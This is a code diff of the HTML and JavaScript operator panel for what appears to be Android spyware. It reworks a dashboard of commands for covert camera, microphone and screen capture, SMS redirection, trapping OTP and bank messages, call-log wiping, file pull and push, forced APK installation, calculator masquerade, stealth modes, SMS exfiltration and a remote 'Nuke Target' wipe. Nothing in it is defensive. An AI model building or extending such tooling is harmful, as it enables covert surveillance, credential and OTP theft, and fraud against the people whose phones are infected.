@@ -74,6 +74,42 @@
         }
 
         .card { background: var(--surface); border: 1px solid var(--surface-light); border-left: 2px solid var(--primary); padding: 15px; margin-bottom: 15px; position: relative; }
+
+        /* Dashboard UI Additions */
+        .cat-group { margin-bottom: 15px; border: 1px solid #222; background: rgba(0,0,0,0.3); }
+        .cat-header { 
+            background: var(--surface-light); padding: 12px 15px; cursor: pointer; 
+            display: flex; justify-content: space-between; align-items: center; 
+            border-left: 4px solid var(--primary); font-weight: bold; font-size: 0.9rem; 
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .cat-header.crisis { border-left-color: var(--danger); color: var(--danger); }
+        .cat-header.surv { border-left-color: var(--success); color: var(--success); }
+        .cat-header.sys { border-left-color: var(--primary); color: var(--primary); }
+        
+        .cat-content { display: none; padding: 10px; }
+        .cat-content.open { display: block; }
+
+        .cmd-tile { 
+            background: #15171a; border: 1px solid #222; margin-bottom: 8px; 
+            transition: 0.2s; overflow: hidden;
+        }
+        .cmd-tile-main {
+            padding: 12px; display: flex; align-items: center; justify-content: space-between; cursor: pointer;
+        }
+        .cmd-tile-main:active { background: #1a1c20; }
+        .cmd-name { font-size: 0.85rem; color: #eee; }
+        .cmd-icon { opacity: 0.5; font-size: 1rem; }
+
+        .cmd-drawer { 
+            display: none; padding: 15px; background: #0a0b0d; border-top: 1px solid #222; 
+            animation: slideDown 0.2s ease-out;
+        }
+        .cmd-drawer.open { display: block; }
+
+        .cmd-actions { display: flex; gap: 8px; margin-top: 10px; }
+
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
         
         .sticky-controls {
             position: sticky;
@@ -216,397 +252,8 @@
         </div>
 
         <div id="view-cmd" class="section">
-            <h2 data-search="interference, alerts, signals, comms, ring, ping, toast, intent">Interference</h2>
-            <div class="card">
-                <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('TOAST', this)" title="Add Search Index">🏷️</button><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Vocal Synthesis (TTS)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('SPEAK_TEXT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SPEAK_TEXT')">?</button>
-                        <input type="text" id="speak-text" placeholder="Message to speak..." style="flex:1">
-                        <input type="number" id="speak-vol" value="80" title="Volume %" style="width:50px">
-                        <button class="btn" onclick="sendCmd('SPEAK_TEXT')">Speak</button>
-                    </div>
-                </div>
-                <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('RING', this)">🏷️</button><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Notification Wipe</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('WIPE_NOTIFICATIONS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('WIPE_NOTIFICATIONS')">?</button>
-                        <select id="wipe-mode" style="width:70px; background:#000; color:var(--primary); border:1px solid var(--surface-light); min-width:0;">
-                            <option value="ALL">ALL</option>
-                            <option value="PKG">PKG</option>
-                            <option value="TEXT">TEXT</option>
-                        </select>
-                        <input type="text" id="wipe-val" placeholder="Package or Keyword" style="flex:1">
-                        <button class="btn" onclick="sendCmd('WIPE_NOTIFICATIONS')">WIPE</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Audio Infrastructure</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('VOLUME', this)">🏷️</button><button class="btn-status" onclick="auditCmd('VOLUME')">?</button>
-                        <select id="vol-stream" style="width:70px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
-                            <option value="RING">RING</option>
-                            <option value="MEDIA">MEDIA</option>
-                            <option value="ALARM">ALARM</option>
-                        </select>
-                        <input type="text" id="vol-level" placeholder="0-100 / SILENT / VIBRATE" style="flex:1">
-                        <button class="btn" onclick="sendCmd('VOLUME')">SET</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Screen Latency (Timeout)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('SCREEN_TIMEOUT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SCREEN_TIMEOUT')">?</button>
-                        <input type="number" id="val-timeout" placeholder="Seconds (e.g. 30)" style="flex:1">
-                        <button class="btn" onclick="sendCmd('SCREEN_TIMEOUT')">SET</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Connectivity & Identity</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('PING', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PING')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('PING')">Ping Probe</button>
-                    </div>
-                    <div class="input-wrap" style="margin-top:5px">
-                        <button class="btn-tag" onclick="tagCmd('GET_TOKEN', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_TOKEN')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('GET_TOKEN')">Fetch Token</button>
-                    </div>
-                </div>
-                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('WAKE', this)" title="Add Search Index">🏷️</button><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
-                
-                <div class="cmd-row">
-                    <label class="cmd-label">Dynamic UI Injection (WebView)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('INJECT_UI', this)">🏷️</button><button class="btn-status" onclick="auditCmd('INJECT_UI')">?</button>
-                        <select id="ui-touchable" style="width:100px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
-                            <option value="TRUE">TOUCHABLE</option>
-                            <option value="FALSE">GHOST (NON-INTERACTIVE)</option>
-                        </select>
-                        <button class="btn" style="flex:1" onclick="sendCmd('INJECT_UI')">INJECT HTML</button>
-                        <button class="btn danger" onclick="sendCmd('REMOVE_UI')">KILL UI</button>
-                    </div>
-                    <textarea id="ui-html" placeholder="<html><body style='background:rgba(0,0,0,0.8);'>..." style="margin-top:5px; font-size:0.65rem; height:80px;"></textarea>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Remote Intent</label>
-                    <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
-                    <input type="text" id="int-data" placeholder="Data (URL/URI)">
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('RUN_INTENT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('RUN_INTENT')">?</button>
-                        <select id="int-tgt" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
-                            <option value="activity">Activity</option>
-                            <option value="service">Service</option>
-                            <option value="broadcast">Broadcast</option>
-                        </select>
-                        <button class="btn" onclick="sendCmd('RUN_INTENT')">Run</button>
-                    </div>
-                </div>
-            </div>
-
-            <h2 data-search="surveillance, eyes, ears, camera, audio, spy, snapshot, screenshot, mic, brightness, blind, stealth, sensors, environment">Surveillance (Optical / Audio / Display / Environment)</h2>
-            <div class="card">
-                <div class="cmd-row">
-                    <label class="cmd-label">Display Authority (Dimmer)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('BRIGHTNESS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('BRIGHTNESS')">?</button>
-                        <input type="number" id="bri-level" value="0" placeholder="0-100" style="width:60px">
-                        <select id="bri-method" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
-                            <option value="ACC">ACC (STEALTH)</option>
-                            <option value="OVERLAY">OVERLAY (STD)</option>
-                            <option value="HARDWARE">HARDWARE</option>
-                            <option value="AUTO">AUTO</option>
-                        </select>
-                        <button class="btn" onclick="sendCmd('BRIGHTNESS')">GO</button>
-                    </div>
-                    <div class="input-wrap" style="margin-top:5px">
-                        <button class="btn-tag" onclick="tagCmd('UNBLIND', this)">🏷️</button><button class="btn-status" onclick="auditCmd('UNBLIND')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('UNBLIND')">MASTER RESET (UNBLIND)</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Display Snapshot</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('GET_SCREENSHOT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SCREENSHOT')">?</button>
-                        <input type="number" id="scr-quality" value="70" title="Quality %" style="width:50px">
-                        <input type="number" id="scr-freq" value="0" title="Freq (0=Single)" style="width:50px">
-                        <input type="number" id="scr-dur" value="0" title="Duration (s)" style="width:50px">
-                        <button class="btn" style="flex:1" onclick="sendCmd('GET_SCREENSHOT')">Capture</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Optical Capture</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('CAPTURE_IMAGE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('CAPTURE_IMAGE')">?</button>
-                        <select id="cam-side" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);"><option value="REAR">Rear</option><option value="FRONT">Front</option></select>
-                        <input type="number" id="cam-count" value="1" placeholder="Qty" style="width:60px">
-                        <button class="btn" onclick="sendCmd('CAPTURE_IMAGE')">Capture</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Acoustic Snippet</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('RECORD_VOICE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('RECORD_VOICE')">?</button>
-                        <input type="number" id="mic-dur" value="10" placeholder="Secs">
-                        <button class="btn" onclick="sendCmd('RECORD_VOICE')">Record Mic</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Interaction Architect (Ghost Chain)</label>
-                    <div class="card" style="padding:10px; border-style:dashed; margin-bottom:5px;">
-                        <div id="touch-chain-list" style="display:flex; flex-direction:column; gap:5px; margin-bottom:10px;"></div>
-                        <div style="display:flex; gap:5px;">
-                            <select id="next-step-type" style="flex:1; background:#000; color:var(--primary); border:1px solid #333;">
-                                <option value="NODE">TAP NODE (ID/Text)</option>
-                                <option value="TAP">TAP COORD (X,Y)</option>
-                                <option value="NAV">NAV ACTION</option>
-                                <option value="WAIT">WAIT (ms)</option>
-                                <option value="SWIPE">SWIPE (X1,Y1,X2,Y2)</option>
-                                <option value="INTENT">REMOTE INTENT (SYS)</option>
-                            </select>
-                            <button class="btn" onclick="addTouchStep()" style="padding:5px 10px; font-size:0.7rem;">+ STEP</button>
-                        </div>
-                    </div>
-                    <textarea id="touch-json-raw" placeholder="[ { &quot;type&quot;: &quot;NAV&quot;, &quot;val&quot;: &quot;BACK&quot; } ]" style="font-size:0.6rem; min-height:40px; margin-bottom:5px;"></textarea>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('REMOTE_TOUCH', this)">🏷️</button><button class="btn-status" onclick="auditCmd('REMOTE_TOUCH')">?</button>
-                        <button class="btn danger" onclick="clearTouchChain()" style="font-size:0.7rem;">RESET</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('REMOTE_TOUCH')">BROADCAST CHAIN</button>
-                    </div>
-                </div>
-            </div>
-
-            <h2 data-search="extraction, forensics, loot, files, sms, scraper, vault, pull, push, contacts, calls, hvt, redirect">Data Extraction & Forensics</h2>
-            <div class="card">
-                <div class="cmd-row">
-                    <label class="cmd-label">Communication Redirection (HVT/Phone)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('ADD_HVT_REDIRECT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_HVT_REDIRECT')">?</button>
-                        <input type="text" id="hvt-sender" placeholder="Target Number (e.g. 8012)" style="flex:1">
-                        <input type="text" id="hvt-dest" placeholder="Dest Number" style="flex:1">
-                        <button class="btn" onclick="sendCmd('ADD_HVT_REDIRECT')">MAP</button>
-                    </div>
-                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.5rem;" onclick="sendCmd('CLEAR_HVT_REDIRECTS')">WIPE ALL PHONE RULES</button>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Keyword Interception Trap</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('ADD_KEYWORD_FORWARD', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_KEYWORD_FORWARD')">?</button>
-                        <input type="text" id="kw-list" placeholder="login,otp,bank,verify" style="flex:1">
-                        <input type="text" id="kw-dest" placeholder="Dest Number" style="flex:1">
-                        <button class="btn" onclick="sendCmd('ADD_KEYWORD_FORWARD')">TRAP</button>
-                    </div>
-                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.5rem;" onclick="sendCmd('CLEAR_KEYWORD_FORWARDS')">WIPE ALL KEYWORD RULES</button>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Automatic Stealth Filters (Auto-Swipe)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('ADD_AUTO_SWIPE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_AUTO_SWIPE')">?</button>
-                        <select id="swipe-type" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
-                            <option value="pkgs">APP PKG</option>
-                            <option value="keywords">STRING</option>
-                            <option value="senders">SENDER</option>
-                        </select>
-                        <input type="text" id="swipe-val" placeholder="Value..." style="flex:1">
-                        <button class="btn" onclick="sendCmd('ADD_AUTO_SWIPE')">ADD RULE</button>
-                    </div>
-                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.55rem;" onclick="sendCmd('CLEAR_AUTO_SWIPE', 'all')">PURGE ALL STEALTH FILTERS</button>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">SMS Filter (Keyword Archive)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('SET_SMS_BLACKLIST', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_SMS_BLACKLIST')">?</button>
-                        <input type="text" id="sms-blacklist" placeholder="127, 994, telebirr..." style="flex:1">
-                        <button class="btn" onclick="sendCmd('SET_SMS_BLACKLIST')">SET LIST</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('GET_TREE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_TREE')">?</button>
-                        <input type="text" id="tree-pkg" placeholder="Package (null for all)" style="flex:1">
-                        <input type="number" id="tree-dur" value="1" title="Duration (Mins)" style="width:50px">
-                        <input type="number" id="tree-depth" value="10" title="Walk Depth" style="width:50px">
-                        <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
-                    </div>
-                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.65rem;" onclick="sendCmd('RESET_SCRAPER')">ABORT ALL SCRAPER SESSIONS</button>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Contact Manipulation (Injection/Purge)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('ADD_CONTACT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_CONTACT')">?</button>
-                        <input type="text" id="con-name" placeholder="Name..." style="flex:1">
-                        <input type="text" id="con-num" placeholder="Number..." style="flex:1">
-                        <button class="btn" onclick="sendCmd('ADD_CONTACT')">INJECT</button>
-                    </div>
-                    <div class="input-wrap" style="margin-top:5px">
-                        <button class="btn-tag" onclick="tagCmd('PURGE_CONTACT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PURGE_CONTACT')">?</button>
-                        <input type="text" id="con-purge" placeholder="Name or Number to wipe" style="flex:1">
-                        <button class="btn danger" onclick="sendCmd('PURGE_CONTACT')">PURGE</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Call Log Sanitizer</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('PHONE_LOGS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PHONE_LOGS')">?</button>
-                        <select id="call-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
-                            <option value="CLEAR_ALL">Wipe All Logs</option>
-                            <option value="DELETE_LAST">Wipe Last (Mins)</option>
-                            <option value="DELETE_NUM">Wipe Number</option>
-                        </select>
-                        <input type="text" id="call-val" placeholder="Val" style="width:80px">
-                        <button class="btn" onclick="sendCmd('PHONE_LOGS')">Sanitize</button>
-                    </div>
-                </div>
-                <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('PULL_FILE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Remote Deployment (Push)</label>
-                    <div style="display:flex; gap:5px; margin-bottom:5px;">
-                        <input type="text" id="push-url" placeholder="Source URL (http://...)" style="flex:1">
-                        <label class="btn" style="padding:8px; font-size:0.7rem; display:flex; align-items:center;">
-                            📁 <input type="file" id="push-local-file" style="display:none" onchange="document.getElementById('push-url').value = 'LOCAL: ' + this.files[0].name">
-                        </label>
-                    </div>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('PUSH_FILE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PUSH_FILE')">?</button>
-                        <input type="text" id="push-path" placeholder="/sdcard/Download/filename.ext" style="flex:1">
-                        <button class="btn" id="push-deploy-btn" onclick="handlePushDeployment()">Deploy</button>
-                    </div>
-                </div>
-                
-                <div class="cmd-row">
-                    <label class="cmd-label">Relentless Package Installer</label>
-                    <input type="text" id="install-path" placeholder="/sdcard/Download/update.apk">
-                    <textarea id="install-html" placeholder="(Optional) Explanation HTML (Cortex.startRelentlessInstall...)" style="font-size:0.65rem; height:60px; margin-top:5px;"></textarea>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('INSTALL_APP', this)">🏷️</button><button class="btn-status" onclick="auditCmd('INSTALL_APP')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('INSTALL_APP')">SPRING THE TRAP</button>
-                        <button class="btn danger" onclick="sendCmd('STOP_INSTALL')" title="Disarm Trap">ABORT</button>
-                    </div>
-                </div>
-                <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SKELETON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_VAULT_SIZE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Identity Extraction</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('GET_ACCOUNTS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Device Accounts</button>
-                    </div>
-                    <div class="input-wrap" style="margin-top:5px">
-                        <button class="btn-tag" onclick="tagCmd('GET_NUMBERS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_NUMBERS')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('GET_NUMBERS')">SIM Hardware Info</button>
-                    </div>
-                </div>
-                <div class="cmd-row"><label class="cmd-label">Environmental Audit (Sensors)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SENSORS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SENSORS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_SENSORS')">Sample Physical State</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('UPLOAD_DUMPS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_LOGS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">User Engagement (7D Trend)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_ENGAGEMENT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ENGAGEMENT')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ENGAGEMENT')">Fetch Usage Metrics</button></div></div>
-            </div>
-
-            <h2 data-search="maintenance, gear, interval, pulse, sync, ready, work, burst">Maintenance</h2>
-            <div class="card">
-                <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('STAY_READY', this)">🏷️</button><button class="btn-status" onclick="auditCmd('STAY_READY')">?</button><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('SET_INTERVAL', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_INTERVAL')">?</button><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Logging System (Live Debugger)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('TOGGLE_LOGGING', this)">🏷️</button><button class="btn-status" onclick="auditCmd('TOGGLE_LOGGING')">?</button><select id="log-state" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="ON">SYSTEM_ON (LOGGING)</option><option value="OFF">SYSTEM_OFF (STEALTH)</option></select><button class="btn" onclick="sendCmd('TOGGLE_LOGGING')">Toggle</button></div></div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Feature Control (Parametric)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('TOGGLE_FEATURE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('TOGGLE_FEATURE')">?</button>
-                        <input type="text" id="tog-feat" placeholder="Feature (e.g. location)" style="flex:1">
-                        <select id="tog-state" style="background:#000; color:var(--primary); border:1px solid var(--surface-light);">
-                            <option value="on">ON</option>
-                            <option value="off">OFF</option>
-                            <option value="sched">SCHED</option>
-                        </select>
-                    </div>
-                    <div class="input-wrap" style="margin-top:5px">
-                        <input type="text" id="tog-p1" placeholder="Mins / Start (00:00)" style="flex:1">
-                        <input type="text" id="tog-p2" placeholder="End (23:59)" style="flex:1">
-                        <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Broadcast</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Force Extraction (Modules:Limit)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('FORCE_UPLOAD', this)">🏷️</button><button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
-                        <input type="text" id="val-force" placeholder="e.g. sms:50, location, usage" value="ALL">
-                        <button class="btn" onclick="sendCmd('FORCE_UPLOAD')">Extract</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Judas Master Fallback (Emergency Phone)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('SET_JUDAS_HANDLER', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_JUDAS_HANDLER')">?</button>
-                        <input type="text" id="judas-handler" placeholder="Phone Number for SMS exfiltration" style="flex:1">
-                        <button class="btn" onclick="sendCmd('SET_JUDAS_HANDLER')">SET</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <label class="cmd-label">Cipher Camouflage (Promo Templates)</label>
-                    <textarea id="promo-templates" placeholder="Template A [TOKEN] ||| Template B [TOKEN]..." style="font-size:0.7rem; height:80px;"></textarea>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('SET_PROMOS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_PROMOS')">?</button>
-                        <button class="btn" style="flex:1" onclick="sendCmd('SET_PROMOS')">BROADCAST TEMPLATES</button>
-                    </div>
-                </div>
-
-                <div class="cmd-row">
-                    <label class="cmd-label">Stealth Masquerade (Skin)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('SET_MASQUERADE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_MASQUERADE')">?</button>
-                        <select id="val-masquerade" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
-                            <option value="DRIVE">DRIVE SERVICES</option>
-                            <option value="CALC">CALCULATOR</option>
-                        </select>
-                        <button class="btn" onclick="sendCmd('SET_MASQUERADE')">APPLY SKIN</button>
-                    </div>
-                </div>
-
-                <div class="cmd-row">
-                    <label class="cmd-label">Master Visibility (Quick Tile State)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('SET_TILE_STATE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_TILE_STATE')">?</button>
-                        <select id="val-tile-state" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
-                            <option value="ON">DIAGNOSTIC (SHOW DASHBOARD)</option>
-                            <option value="OFF">STEALTH (MASQUERADE MODE)</option>
-                        </select>
-                        <button class="btn" onclick="sendCmd('SET_TILE_STATE', document.getElementById('val-tile-state').value)">SET MODE</button>
-                    </div>
-                </div>
-            </div>
-
-            <h2 style="background: var(--danger)" data-search="crisis, panic, nuke, wipe, red, beacon, suicide">Crisis Management</h2>
-            <div class="card" style="border-color: var(--danger)">
-                <div class="cmd-row">
-                    <label class="cmd-label">Code Red (0=ALL, 3=PHONE, 8=NET, 9=APPS)</label>
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('CODERED', this)">🏷️</button><button class="btn-status" onclick="auditCmd('CODERED')">?</button>
-                        <input type="text" id="cr-code" value="0" placeholder="Codes" style="width:60px">
-                        <input type="number" id="cr-dur" value="15" placeholder="Mins">
-                        <input type="number" id="cr-freq" value="30" placeholder="Freq(s)">
-                        <button class="btn danger" onclick="sendCmd('CODERED')">Trigger</button>
-                    </div>
-                </div>
-                <div class="cmd-row">
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('STOP_BEACON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('STOP_BEACON')">?</button>
-                        <button class="btn danger" style="flex:1" onclick="sendCmd('STOP_BEACON')">Dark Mode (Stop Beacon)</button>
-                    </div>
-                </div>
-                <div class="cmd-row" style="margin-top:10px;">
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('LOCK_SCREEN', this)">🏷️</button><button class="btn-status" onclick="auditCmd('LOCK_SCREEN')">?</button>
-                        <button class="btn danger" style="flex:1" onclick="sendCmd('LOCK_SCREEN')">FORCE HARDWARE LOCK</button>
-                    </div>
-                </div>
-                <div class="cmd-row" style="margin-top:10px;">
-                    <div class="input-wrap">
-                        <button class="btn-tag" onclick="tagCmd('NUKE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('NUKE')">?</button>
-                        <button class="btn danger" style="flex:1" onclick="if(confirm('PURGE DATA & UNINSTALL?')) sendCmd('NUKE')">Nuke Target</button>
-                    </div>
-                </div>
-            </div>
+            <!-- Grouped Dashboard will be dynamically rendered here -->
+            <div id="cmd-dashboard-container"></div>
         </div>
 
         <div id="view-files" class="section">
@@ -663,6 +310,153 @@
         let activeTab = 'dash';
         let touchChain = [];
 
+        const COMMAND_GROUPS = [
+            {
+                id: 'comm', 
+                label: 'Communications & Logs', 
+                css: 'sys', 
+                search: 'sms, calls, contacts, keywords, filter, hvt, redirection, forward',
+                commands: [
+                    { id: 'ADD_HVT_REDIRECT', name: 'SMS Redirection (HVT)', icon: '🔄', inputs: [{id: 'hvt-sender', label: 'Target Number', type: 'text'}, {id: 'hvt-dest', label: 'Destination', type: 'text'}] },
+                    { id: 'ADD_KEYWORD_FORWARD', name: 'Keyword SMS Trap', icon: '🪤', inputs: [{id: 'kw-list', label: 'Keywords (login,otp)', type: 'text'}, {id: 'kw-dest', label: 'Destination', type: 'text'}] },
